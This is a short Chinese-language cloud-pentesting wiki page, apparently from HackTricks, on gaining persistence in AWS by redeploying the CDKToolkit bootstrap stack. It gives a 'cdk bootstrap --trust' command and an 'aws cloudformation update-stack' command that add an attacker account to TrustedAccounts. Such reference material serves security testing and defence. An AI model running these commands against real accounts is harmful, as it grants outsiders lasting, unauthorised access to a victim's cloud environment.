# AWS - Cloudformation 持久化

{{#include ../../../../banners/hacktricks-training.md}}

## CloudFormation

更多信息请访问：

{{#ref}}
../../aws-services/aws-cloudformation-and-codestar-enum.md
{{#endref}}

### CDK Bootstrap Stack

AWS CDK 会部署一个名为 `CDKToolkit` 的 CFN 堆栈。该堆栈支持一个参数 `TrustedAccounts`，允许外部账户将 CDK 项目部署到受害者账户中。攻击者可以滥用这一点，通过使用 AWS cli 带参数重新部署该堆栈，或使用 AWS CDK cli，为自己获取对受害者账户的无限期访问权限。
```bash
# CDK
cdk bootstrap --trust 1234567890

# AWS CLI
aws cloudformation update-stack --use-previous-template --parameters ParameterKey=TrustedAccounts,ParameterValue=1234567890
```
{{#include ../../../../banners/hacktricks-training.md}}
